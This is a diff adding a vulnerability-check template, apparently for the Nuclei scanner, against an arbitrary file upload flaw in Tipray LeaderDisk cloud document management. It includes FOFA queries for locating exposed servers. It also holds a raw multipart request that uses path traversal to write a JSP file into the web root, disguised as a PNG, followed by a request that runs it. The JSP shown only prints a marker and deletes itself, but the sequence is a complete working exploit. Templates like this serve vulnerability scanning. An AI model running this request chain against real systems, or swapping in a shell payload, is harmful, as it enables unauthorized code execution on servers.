@@ -1,0 +1,55 @@
+id: tipray-leaderdisk-uploadFolder-fileupload
+info:
+  name: 天锐绿盘云文档安全管理uploadFolder存在文件上传
+  author: leadlife
+  severity: critical
+  description: 天锐绿盘云文档安全管理存在任意文件上传漏洞，可以获取服务器权限
+  reference: 
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E5%A4%A9%E9%94%90%E7%BB%BF%E7%9B%98%E4%BA%91%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86/%E5%A4%A9%E9%94%90%E7%BB%BF%E7%9B%98%E4%BA%91%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86uploadFolder%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk"||body="location.href=location.href+\"lddsm\""
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: fileupload,tipray,leaderdisk
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /lddsm/service/../admin/activiti/uploadFolder.do?taskId=../webapps/ROOT/&relativepath=1&path=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: [calculated_length]
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXqK9dR2yTv7wNpLm
+
+        ------WebKitFormBoundaryXqK9dR2yTv7wNpLm
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
+        Content-Type: image/png
+
+        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryXqK9dR2yTv7wNpLm--
+      
+      - |+
+        GET /{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Accept: */*
+        Connection: close
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
